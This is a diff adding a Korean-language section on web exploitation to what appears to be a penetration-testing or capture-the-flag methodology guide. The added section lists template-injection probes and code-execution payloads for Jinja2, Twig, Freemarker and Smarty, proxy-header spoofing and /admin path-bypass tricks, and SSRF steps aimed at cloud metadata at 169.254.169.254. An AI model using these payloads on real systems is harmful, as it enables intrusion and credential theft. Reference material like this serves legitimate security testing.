@@ -59,6 +59,45 @@
 - 주석 처리된 코드: 비활성 기능이지만 내부 API 구조, 엔드포인트 힌트를 노출
 
 ============================================================
+## Web Exploit Focus
+============================================================
+
+### 템플릿 엔진 탐지 및 SSTI
+
+엔진 식별 → 해당 엔진의 페이로드 적용:
+
+| 엔진 | 탐지 패턴 | 기본 페이로드 |
+|------|-----------|--------------|
+| Jinja2 (Python) | `{{7*7}}` → 49 | `{{config.__class__.__init__.__globals__}}` |
+| Twig (PHP) | `{{7*7}}` → 49 | `{{_self.env.registerUndefinedFilterCallback("exec")}}` |
+| Pebble (Java) | `{{7*7}}` → 49 | `{%% for x in "".class.forName("java.lang.Runtime")... %%}` |
+| Freemarker | `${7*7}` → 49 | `<#assign ex="freemarker.template.utility.Execute"?new()>` |
+| Smarty (PHP) | `{7*7}` → 49 | `{php}echo system('id');{/php}` |
+
+→ 탐지 단계에서 arithmetic test만 먼저 수행, RCE payload는 엔진 확정 후
+
+### 미들웨어 / 리버스 프록시 동작
+
+**헤더 신뢰 문제:**
+- `X-Forwarded-For`, `X-Real-IP`: 프록시 뒤 서버가 이 헤더를 신뢰하면 IP 위조 가능
+- `X-Forwarded-Host`: Host 헤더 덮어쓰기 → password reset link 조작 등
+- `X-Original-URL`, `X-Rewrite-URL`: 라우팅 우회 가능성
+
+**프록시 레이어 존재 시 확인:**
+- 백엔드와 프론트엔드 간 URL 파싱 차이 → path confusion
+- 프록시가 strip하는 헤더 vs 백엔드가 신뢰하는 헤더 불일치
+- `/admin` 접근 차단 → `//admin`, `/;/admin`, `/admin/..` 등 우회
+
+### SSRF Pivot 전략
+
+내부망 접근이 가능한 SSRF 확인 시:
+1. `http://127.0.0.1/` → 로컬 서비스 탐색
+2. `http://169.254.169.254/` → 클라우드 메타데이터 (AWS/GCP/Azure)
+3. 내부 포트 스캔: `http://127.0.0.1:PORT/`
+4. 내부 API 호출: Swagger/actuator/admin 엔드포인트 탐색
+5. 프로토콜 변환: `file://`, `gopher://`, `dict://` 지원 여부 확인
+
+============================================================
 ## Web RCE 공통 패턴
 ============================================================
 
